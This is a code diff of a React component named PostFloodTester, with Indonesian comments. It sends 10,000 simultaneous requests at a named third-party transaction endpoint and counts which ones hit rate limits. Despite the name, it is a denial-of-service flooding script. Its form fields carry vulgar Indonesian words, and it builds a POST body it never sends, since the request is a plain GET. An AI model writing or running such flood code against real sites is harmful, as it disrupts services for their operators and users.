@@ -1,34 +1,51 @@
 import React from "react";
 
 const PostFloodTester: React.FC = () => {
-  const handlePostFlood = () => {
-    const jumlahRequest = 10000;
-    const ajaxUrl = "https://anakindonesiaemas2045.com";
-    const nonce = "20dfddfe5c";
+  const handlePostFlood = async () => {
+  const totalRequest = 10000;     // Total request yang mau dikirim
+  const concurrency = 10000;       // Maksimal request yang berjalan paralel
+  const ajaxUrl = "https://dododolan.com/get_transaction_detail.php";
+  const nonce = "20dfddfe5c";
 
-    for (let i = 0; i < jumlahRequest; i++) {
-      const formData = new FormData();
-      formData.append("action", "POST"); // Ganti ini dengan nama action yang didaftarkan di PHP WordPress
-      formData.append("nonce", nonce);
-      formData.append("nama", `Faizh ${i}`);
-      formData.append("pesan", `Tes POST ke-${i}`);
+  // Fungsi kirim satu POST request ke server
+  const sendPost = async (i:any) => {
+    const formData = new FormData();
+    formData.append("action", "POST");
+    formData.append("nonce", nonce);
+    formData.append("nama", `kwontol ${i}`);
+    formData.append("pesan", `memek`);
 
-      fetch(ajaxUrl, {
-        method: "POST",
-        body: formData,
-      })
-        .then((res) => {
-          if (res.status === 429) {
-            console.warn(`❌ [${i}] Ditolak: Rate Limit`);
-          } else {
-            console.log(`✅ [${i}] Berhasil:`, res.status);
-          }
-        })
-        .catch((e) => {
-          console.error(`🔥 [${i}] Gagal kirim POST:`, e);
-        });
+    try {
+      const res = await fetch(ajaxUrl, {
+        method: "GET"
+      });
+
+      if (res.status === 429) {
+        console.warn(`❌ [${i}] Ditolak: Rate Limit`);
+      } else {
+        console.log(`✅ [${i}] Berhasil:`, res.status);
+      }
+    } catch (e) {
+      console.error(`🔥 [${i}] Gagal kirim POST:`, e);
     }
   };
+
+  // Buat array berisi angka 0 sampai totalRequest-1
+  const indices = Array.from({ length: totalRequest }, (_, i) => i);
+
+  // Proses request secara batch sesuai concurrency limit
+  for (let i = 0; i < indices.length; i += concurrency) {
+    // Ambil batch sebanyak concurrency
+    const batch = indices.slice(i, i + concurrency);
+
+    // Jalankan batch secara paralel (Promise.all)
+    await Promise.all(batch.map(sendPost));
+    // Setelah batch selesai, baru lanjut batch berikutnya
+  }
+
+  console.log("Semua request sudah selesai.");
+};
+
 
   return (
     <div className="p-4">
